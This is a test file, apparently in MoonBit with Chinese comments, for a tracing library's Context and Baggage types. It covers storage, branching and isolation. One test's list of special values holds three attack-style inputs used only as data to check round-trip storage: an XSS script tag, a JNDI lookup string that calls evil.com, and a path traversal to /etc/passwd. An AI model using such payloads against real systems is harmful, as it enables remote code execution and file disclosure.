// Context并发安全测试
test "context_concurrent_creation_and_access" {
  // 测试Context的并发创建和访问
  
  // 创建多个Context实例
  let ctx1 = Context::empty()
  let ctx2 = Context::empty()
  let ctx3 = Context::empty()
  let ctx4 = Context::empty()
  let ctx5 = Context::empty()
  
  // 验证所有Context都是空的
  assert_eq(ctx1.values.length(), 0)
  assert_eq(ctx2.values.length(), 0)
  assert_eq(ctx3.values.length(), 0)
  assert_eq(ctx4.values.length(), 0)
  assert_eq(ctx5.values.length(), 0)
  
  // 为每个Context添加不同的值
  let key1 = create_key("key1")
  let key2 = create_key("key2")
  let key3 = create_key("key3")
  let key4 = create_key("key4")
  let key5 = create_key("key5")
  
  let enriched_ctx1 = ctx1.with_value(key1, "value1")
  let enriched_ctx2 = ctx2.with_value(key2, "value2")
  let enriched_ctx3 = ctx3.with_value(key3, "value3")
  let enriched_ctx4 = ctx4.with_value(key4, "value4")
  let enriched_ctx5 = ctx5.with_value(key5, "value5")
  
  // 验证每个Context都有正确的值
  match enriched_ctx1.get(key1) {
    Some(value) => assert_eq(value, "value1")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx2.get(key2) {
    Some(value) => assert_eq(value, "value2")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx3.get(key3) {
    Some(value) => assert_eq(value, "value3")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx4.get(key4) {
    Some(value) => assert_eq(value, "value4")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx5.get(key5) {
    Some(value) => assert_eq(value, "value5")
    None => @test.fail("Test failed")
  }
  
  // 验证Context之间没有相互影响
  match enriched_ctx1.get(key2) {
    Some(_) => @test.fail("Test failed")
    None => assert_eq(true, true)
  }
  
  match enriched_ctx2.get(key1) {
    Some(_) => @test.fail("Test failed")
    None => assert_eq(true, true)
  }
}

test "context_concurrent_chained_operations" {
  // 测试Context的并发链式操作
  
  let base_ctx = Context::empty()
  
  // 创建多个键
  let keys = [
    create_key("trace.id"),
    create_key("span.id"),
    create_key("user.id"),
    create_key("session.id"),
    create_key("request.id"),
    create_key("correlation.id"),
    create_key("operation.name"),
    create_key("service.name"),
    create_key("deployment.env"),
    create_key("host.name")
  ]
  
  // 创建对应的值
  let values = [
    "trace-12345678901234567890123456789012",
    "span-1234567890123456",
    "user-123456789",
    "session-abcdef123456",
    "req-1234567890abcdef",
    "corr-abcdef1234567890",
    "getUserProfile",
    "user-service",
    "production",
    "prod-server-01"
  ]
  
  // 逐步构建Context
  let mut ctx = base_ctx
  let mut i = 0
  while i < keys.length() {
    ctx = ctx.with_value(keys[i], values[i])
    i = i + 1
  }
  
  // 验证所有值都正确设置
  i = 0
  while i < keys.length() {
    match ctx.get(keys[i]) {
      Some(value) => assert_eq(value, values[i])
      None => @test.fail("Expected Some(value) for key: " + i.to_string())
    }
    i = i + 1
  }
  
  // 验证Context包含所有值
  assert_eq(ctx.values.length(), 10)
  
  // 创建新的Context分支
  let branch1_ctx = ctx.with_value(create_key("branch1.key"), "branch1.value")
  let branch2_ctx = ctx.with_value(create_key("branch2.key"), "branch2.value")
  let branch3_ctx = ctx.with_value(create_key("branch3.key"), "branch3.value")
  
  // 验证原始Context不受影响
  assert_eq(ctx.values.length(), 10)
  
  // 验证分支Context包含原始值和新值
  assert_eq(branch1_ctx.values.length(), 11)
  assert_eq(branch2_ctx.values.length(), 11)
  assert_eq(branch3_ctx.values.length(), 11)
  
  match branch1_ctx.get(create_key("branch1.key")) {
    Some(value) => assert_eq(value, "branch1.value")
    None => @test.fail("Test failed")
  }
  
  match branch2_ctx.get(create_key("branch2.key")) {
    Some(value) => assert_eq(value, "branch2.value")
    None => @test.fail("Test failed")
  }
  
  match branch3_ctx.get(create_key("branch3.key")) {
    Some(value) => assert_eq(value, "branch3.value")
    None => @test.fail("Test failed")
  }
}

test "context_concurrent_baggage_operations" {
  // 测试Context和Baggage的并发操作
  
  let ctx = Context::empty()
  let baggage = Baggage::empty()
  
  // 并发地向Context和Baggage添加数据
  let context_key1 = create_key("trace.id")
  let context_key2 = create_key("span.id")
  let context_key3 = create_key("user.id")
  
  let enriched_ctx = ctx
    .with_value(context_key1, "trace-12345678901234567890123456789012")
    .with_value(context_key2, "span-1234567890123456")
    .with_value(context_key3, "user-123456789")
  
  let enriched_baggage = baggage
    .with_entry("user.id", "user-123456789")
    .with_entry("session.id", "session-abcdef123456")
    .with_entry("request.id", "req-1234567890abcdef")
    .with_entry("correlation.id", "corr-abcdef1234567890")
    .with_entry("service.name", "user-service")
    .with_entry("deployment.env", "production")
  
  // 验证Context中的值
  match enriched_ctx.get(context_key1) {
    Some(value) => assert_eq(value, "trace-12345678901234567890123456789012")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx.get(context_key2) {
    Some(value) => assert_eq(value, "span-1234567890123456")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx.get(context_key3) {
    Some(value) => assert_eq(value, "user-123456789")
    None => @test.fail("Test failed")
  }
  
  // 验证Baggage中的值
  match enriched_baggage.get("user.id") {
    Some(value) => assert_eq(value, "user-123456789")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get("session.id") {
    Some(value) => assert_eq(value, "session-abcdef123456")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get("request.id") {
    Some(value) => assert_eq(value, "req-1234567890abcdef")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get("correlation.id") {
    Some(value) => assert_eq(value, "corr-abcdef1234567890")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get("service.name") {
    Some(value) => assert_eq(value, "user-service")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get("deployment.env") {
    Some(value) => assert_eq(value, "production")
    None => @test.fail("Test failed")
  }
  
  // 验证Context和Baggage的独立性
  assert_eq(enriched_ctx.values.length(), 3)
  assert_eq(enriched_baggage.entries.length(), 6)
}

test "context_concurrent_complex_scenarios" {
  // 测试Context的复杂并发场景
  
  // 创建多个Context分支
  let root_ctx = Context::empty()
  
  // 第一层分支
  let branch_a = root_ctx.with_value(create_key("branch"), "A")
  let branch_b = root_ctx.with_value(create_key("branch"), "B")
  let branch_c = root_ctx.with_value(create_key("branch"), "C")
  
  // 第二层分支
  let branch_a_1 = branch_a.with_value(create_key("sub_branch"), "A1")
  let branch_a_2 = branch_a.with_value(create_key("sub_branch"), "A2")
  let branch_b_1 = branch_b.with_value(create_key("sub_branch"), "B1")
  let branch_b_2 = branch_b.with_value(create_key("sub_branch"), "B2")
  let branch_c_1 = branch_c.with_value(create_key("sub_branch"), "C1")
  let branch_c_2 = branch_c.with_value(create_key("sub_branch"), "C2")
  
  // 第三层分支 - 添加更多复杂的数据
  let complex_branch_a_1 = branch_a_1
    .with_value(create_key("trace.id"), "trace-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    .with_value(create_key("span.id"), "span-aaaaaaaaaaaaaaaa")
    .with_value(create_key("user.id"), "user-111111111")
    .with_value(create_key("operation.name"), "operation.A1")
    .with_value(create_key("service.name"), "service-A1")
  
  let complex_branch_b_2 = branch_b_2
    .with_value(create_key("trace.id"), "trace-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
    .with_value(create_key("span.id"), "span-bbbbbbbbbbbbbbbbb")
    .with_value(create_key("user.id"), "user-222222222")
    .with_value(create_key("operation.name"), "operation.B2")
    .with_value(create_key("service.name"), "service-B2")
  
  // 验证分支独立性
  match branch_a.get(create_key("branch")) {
    Some(value) => assert_eq(value, "A")
    None => @test.fail("Test failed")
  }
  
  match branch_b.get(create_key("branch")) {
    Some(value) => assert_eq(value, "B")
    None => @test.fail("Test failed")
  }
  
  match branch_c.get(create_key("branch")) {
    Some(value) => assert_eq(value, "C")
    None => @test.fail("Test failed")
  }
  
  // 验证子分支
  match branch_a_1.get(create_key("sub_branch")) {
    Some(value) => assert_eq(value, "A1")
    None => @test.fail("Test failed")
  }
  
  match branch_b_2.get(create_key("sub_branch")) {
    Some(value) => assert_eq(value, "B2")
    None => @test.fail("Test failed")
  }
  
  // 验证复杂分支
  match complex_branch_a_1.get(create_key("trace.id")) {
    Some(value) => assert_eq(value, "trace-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    None => @test.fail("Test failed")
  }
  
  match complex_branch_a_1.get(create_key("operation.name")) {
    Some(value) => assert_eq(value, "operation.A1")
    None => @test.fail("Test failed")
  }
  
  match complex_branch_b_2.get(create_key("trace.id")) {
    Some(value) => assert_eq(value, "trace-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
    None => @test.fail("Test failed")
  }
  
  match complex_branch_b_2.get(create_key("operation.name")) {
    Some(value) => assert_eq(value, "operation.B2")
    None => @test.fail("Test failed")
  }
  
  // 验证分支之间的隔离
  match branch_a.get(create_key("sub_branch")) {
    Some(_) => @test.fail("Test failed")
    None => assert_eq(true, true)
  }
  
  match complex_branch_a_1.get(create_key("service.name")) {
    Some(value) => assert_eq(value, "service-A1")
    None => @test.fail("Test failed")
  }
  
  match complex_branch_b_2.get(create_key("service.name")) {
    Some(value) => assert_eq(value, "service-B2")
    None => @test.fail("Test failed")
  }
  
  // 验证Context大小
  assert_eq(root_ctx.values.length(), 0)
  assert_eq(branch_a.values.length(), 1)
  assert_eq(branch_a_1.values.length(), 2)
  assert_eq(complex_branch_a_1.values.length(), 7)
  assert_eq(complex_branch_b_2.values.length(), 7)
}

test "context_concurrent_large_scale_operations" {
  // 测试Context的大规模并发操作
  
  let base_ctx = Context::empty()
  
  // 创建大量键值对
  let mut ctx = base_ctx
  let mut i = 0
  while i < 1000 {
    let key = create_key("key." + i.to_string())
    let value = "value." + i.to_string()
    ctx = ctx.with_value(key, value)
    i = i + 1
  }
  
  // 验证所有键值对都存在
  assert_eq(ctx.values.length(), 1000)
  
  // 验证特定键的值
  match ctx.get(create_key("key.0")) {
    Some(value) => assert_eq(value, "value.0")
    None => @test.fail("Test failed")
  }
  
  match ctx.get(create_key("key.999")) {
    Some(value) => assert_eq(value, "value.999")
    None => @test.fail("Test failed")
  }
  
  match ctx.get(create_key("key.500")) {
    Some(value) => assert_eq(value, "value.500")
    None => @test.fail("Test failed")
  }
  
  // 验证不存在的键
  match ctx.get(create_key("nonexistent")) {
    Some(_) => @test.fail("Test failed")
    None => assert_eq(true, true)
  }
  
  // 创建多个大型Context分支
  let large_branch1 = ctx.with_value(create_key("branch"), "large1")
  let large_branch2 = ctx.with_value(create_key("branch"), "large2")
  let large_branch3 = ctx.with_value(create_key("branch"), "large3")
  
  // 验证大型分支
  assert_eq(large_branch1.values.length(), 1001)
  assert_eq(large_branch2.values.length(), 1001)
  assert_eq(large_branch3.values.length(), 1001)
  
  // 验证大型分支仍然包含原始数据
  match large_branch1.get(create_key("key.100")) {
    Some(value) => assert_eq(value, "value.100")
    None => @test.fail("Test failed")
  }
  
  match large_branch2.get(create_key("key.200")) {
    Some(value) => assert_eq(value, "value.200")
    None => @test.fail("Test failed")
  }
  
  match large_branch3.get(create_key("key.300")) {
    Some(value) => assert_eq(value, "value.300")
    None => @test.fail("Test failed")
  }
  
  // 验证分支特定值
  match large_branch1.get(create_key("branch")) {
    Some(value) => assert_eq(value, "large1")
    None => @test.fail("Test failed")
  }
  
  match large_branch2.get(create_key("branch")) {
    Some(value) => assert_eq(value, "large2")
    None => @test.fail("Test failed")
  }
  
  match large_branch3.get(create_key("branch")) {
    Some(value) => assert_eq(value, "large3")
    None => @test.fail("Test failed")
  }
}

test "context_concurrent_special_value_handling" {
  // 测试Context对特殊值的并发处理
  
  let base_ctx = Context::empty()
  
  // 测试特殊字符串值
  let special_values = [
    "",  // 空字符串
    " ",  // 空格
    "\t",  // 制表符
    "\n",  // 换行符
    "\r",  // 回车符
    "!@#$%^&*()",  // 特殊字符
    "测试中文",  // 中文
    "🚀emoji",  // emoji
    "a".repeat(1000),  // 长字符串
    "string with spaces",  // 包含空格的字符串
    "string.with.dots",  // 包含点号
    "string_with_underscores",  // 包含下划线
    "string-with-hyphens",  // 包含连字符
    "UPPERCASE",  // 大写
    "lowercase",  // 小写
    "MixedCase",  // 混合大小写
    "123numeric",  // 数字开头
    "numeric123",  // 数字结尾
    "a\nb\tc\rd",  // 混合特殊字符
    "<script>alert('xss')</script>",  // XSS-like
    "${jndi:ldap://evil.com/a}",  // JNDI-like
    "../../etc/passwd"  // 路径遍历like
  ]
  
  // 为每个特殊值创建Context
  let mut contexts = []
  let mut i = 0
  while i < special_values.length() {
    let key = create_key("special.value." + i.to_string())
    let ctx = base_ctx.with_value(key, special_values[i])
    contexts.push((key, ctx, special_values[i]))
    i = i + 1
  }
  
  // 验证所有特殊值都正确存储和检索
  i = 0
  while i < contexts.length() {
    let (key, ctx, expected_value) = contexts[i]
    match ctx.get(key) {
      Some(actual_value) => {
        if actual_value != expected_value {
          @test.fail("Expected '" + expected_value + "', got '" + actual_value + "'")
        }
      }
      None => @test.fail("Expected Some(value) for special value: " + i.to_string())
    }
    i = i + 1
  }
  
  // 测试特殊键名
  let special_keys = [
    "",
    " ",
    "special.key",
    "special_key",
    "special-key",
    "special.key.with.dots",
    "special_key_with_underscores",
    "special-key-with-hyphens",
    "UPPERCASE.KEY",
    "lowercase.key",
    "MixedCase.Key",
    "123numeric.key",
    "numeric123.key",
    "key with spaces",
    "测试中文.key",
    "special!@#$%^&*().key",
    "very.long.key.name.with.many.parts.and.very.long.length.that.might.cause.issues.in.some.systems"
  ]
  
  // 为每个特殊键创建Context
  let mut special_key_contexts = []
  i = 0
  while i < special_keys.length() {
    let key = create_key(special_keys[i])
    let ctx = base_ctx.with_value(key, "value.for." + special_keys[i])
    special_key_contexts.push((key, ctx))
    i = i + 1
  }
  
  // 验证所有特殊键都能正确工作
  i = 0
  while i < special_key_contexts.length() {
    let (key, ctx) = special_key_contexts[i]
    match ctx.get(key) {
      Some(value) => {
        let expected_prefix = "value.for."
        if value.length() < expected_prefix.length() || value[0:expected_prefix.length()] != expected_prefix {
          @test.fail("Unexpected value for special key: " + value)
        }
      }
      None => @test.fail("Expected Some(value) for special key: " + i.to_string())
    }
    i = i + 1
  }
}

test "context_concurrent_baggage_isolation" {
  // 测试Context和Baggage的并发隔离
  
  let ctx = Context::empty()
  let baggage = Baggage::empty()
  
  // 并发地向Context和Baggage添加相同键的不同值
  let ctx_key = create_key("shared.key")
  let baggage_key = "shared.key"
  
  let enriched_ctx = ctx
    .with_value(ctx_key, "context.value")
    .with_value(create_key("context.only"), "context.only.value")
  
  let enriched_baggage = baggage
    .with_entry(baggage_key, "baggage.value")
    .with_entry("baggage.only", "baggage.only.value")
  
  // 验证Context和Baggage的隔离
  match enriched_ctx.get(ctx_key) {
    Some(value) => assert_eq(value, "context.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get(baggage_key) {
    Some(value) => assert_eq(value, "baggage.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_ctx.get(create_key("context.only")) {
    Some(value) => assert_eq(value, "context.only.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage.get("baggage.only") {
    Some(value) => assert_eq(value, "baggage.only.value")
    None => @test.fail("Test failed")
  }
  
  // 验证Context中没有baggage的值
  match enriched_ctx.get(create_key("baggage.only")) {
    Some(_) => @test.fail("Test failed")
    None => assert_eq(true, true)
  }
  
  // 验证Baggage中没有context的值
  match enriched_baggage.get("context.only") {
    Some(_) => @test.fail("Test failed")
    None => assert_eq(true, true)
  }
  
  // 创建多个独立的Baggage实例
  let baggage1 = Baggage::empty()
  let baggage2 = Baggage::empty()
  let baggage3 = Baggage::empty()
  
  let enriched_baggage1 = baggage1
    .with_entry("shared.key", "baggage1.value")
    .with_entry("baggage1.only", "baggage1.only.value")
  
  let enriched_baggage2 = baggage2
    .with_entry("shared.key", "baggage2.value")
    .with_entry("baggage2.only", "baggage2.only.value")
  
  let enriched_baggage3 = baggage3
    .with_entry("shared.key", "baggage3.value")
    .with_entry("baggage3.only", "baggage3.only.value")
  
  // 验证Baggage实例之间的隔离
  match enriched_baggage1.get("shared.key") {
    Some(value) => assert_eq(value, "baggage1.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage2.get("shared.key") {
    Some(value) => assert_eq(value, "baggage2.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage3.get("shared.key") {
    Some(value) => assert_eq(value, "baggage3.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage1.get("baggage1.only") {
    Some(value) => assert_eq(value, "baggage1.only.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage2.get("baggage2.only") {
    Some(value) => assert_eq(value, "baggage2.only.value")
    None => @test.fail("Test failed")
  }
  
  match enriched_baggage3.get("baggage3.only") {
    Some(value) => assert_eq(value, "baggage3.only.value")
    None => @test.fail("Test failed")
  }
}